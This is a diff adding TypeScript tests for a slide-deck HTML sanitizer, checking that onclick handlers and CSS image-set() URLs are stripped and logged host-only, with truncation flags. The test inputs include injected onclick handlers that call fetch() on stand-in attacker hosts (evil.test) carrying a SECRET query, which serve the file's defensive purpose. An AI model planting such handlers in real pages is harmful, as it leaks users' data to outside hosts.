@@ -241,6 +241,86 @@ test('a handler that names a host is logged host-only, in several shapes', async
   }
 })
 
+const HANDLER_LOG_EDGE_CASES: Array<[string, string, string]> = [
+  ['userinfo', `https://user:pass@userinfo.evil.test/p.png?SECRET`, 'userinfo.evil.test'],
+  ['escaped slashes', String.raw`https:\/\/escaped.evil.test/p.png?SECRET`, 'escaped.evil.test'],
+  ['single-label host', `http://localhost:43143/p.png?SECRET`, 'localhost'],
+  ['protocol-relative single-label host', `//localhost:43143/p.png?SECRET`, 'localhost'],
+]
+for (const [name, url, host] of HANDLER_LOG_EDGE_CASES) {
+  test(`a handler host is logged with ${name} in the URL`, async () => {
+    const { logger } = await import('./log.ts')
+    const orig = logger.warn
+    const lines: string[] = []
+    logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
+    let out = ''
+    try {
+      out = one(`<section><p onclick="fetch('${url}')">x</p></section>`)
+    } finally {
+      logger.warn = orig
+    }
+    const all = lines.join('\n')
+    assert.ok(all.includes(`"hosts":["${host}"]`), `${url}: ${all}`)
+    assert.doesNotMatch(out, /onclick|SECRET/)
+    assert.doesNotMatch(all, /SECRET|\/p\.png/, url)
+  })
+}
+
+test('string URLs stripped from image-set() are logged host-only', async () => {
+  const { sanitizeDeckSlideHtml } = await import('./sanitizeDsHtml.ts')
+  const { logger } = await import('./log.ts')
+  const orig = logger.warn
+  const lines: string[] = []
+  logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
+  let out = ''
+  try {
+    out = sanitizeDeckSlideHtml(
+      '<section><style>.a{background-image:image-set("https://image-set-block.evil.test/a.png" 1x)}</style>' +
+        `<div style='background-image:-webkit-image-set("https://webkit-image-set-attr.evil.test/b.png" 1x)'>x</div></section>`
+    )
+  } finally {
+    logger.warn = orig
+  }
+  const all = lines.join('\n')
+  assert.ok(all.includes('"image-set-block.evil.test"'), all)
+  assert.ok(all.includes('"webkit-image-set-attr.evil.test"'), all)
+  assert.doesNotMatch(out, /image-set-block|webkit-image-set-attr/)
+})
+
+test('a handler URL over the length cap flags the log entry as truncated', async () => {
+  const { logger } = await import('./log.ts')
+  const orig = logger.warn
+  const lines: string[] = []
+  logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
+  let out = ''
+  try {
+    const userinfo = 'x'.repeat(2100)
+    out = one(`<section><p onclick="fetch('http://${userinfo}@long-userinfo.evil.test/p.png')">x</p></section>`)
+  } finally {
+    logger.warn = orig
+  }
+  const all = lines.join('\n')
+  assert.ok(all.includes('"truncated":true'), all)
+  assert.doesNotMatch(out, /onclick|long-userinfo\.evil\.test/)
+})
+
+test('handler telemetry flags truncation past the first 256 URL candidates', async () => {
+  const { logger } = await import('./log.ts')
+  const orig = logger.warn
+  const lines: string[] = []
+  logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
+  let out = ''
+  try {
+    const calls = Array.from({ length: 257 }, (_, i) => `fetch('https://handler-${i}.evil.test/p.png')`).join(';')
+    out = one(`<section><p onclick="${calls}">x</p></section>`)
+  } finally {
+    logger.warn = orig
+  }
+  const all = lines.join('\n')
+  assert.ok(all.includes('"truncated":true'), all)
+  assert.doesNotMatch(out, /onclick|handler-\d+\.evil\.test/)
+})
+
 test('repeat reads of the same stored slide are memoized and give the same output', async () => {
   const { sanitizeDeckSlideHtml } = await import('./sanitizeDsHtml.ts')
   const html = '<section><img src="https://memo.evil.test/x.png"><p>memo</p></section>'
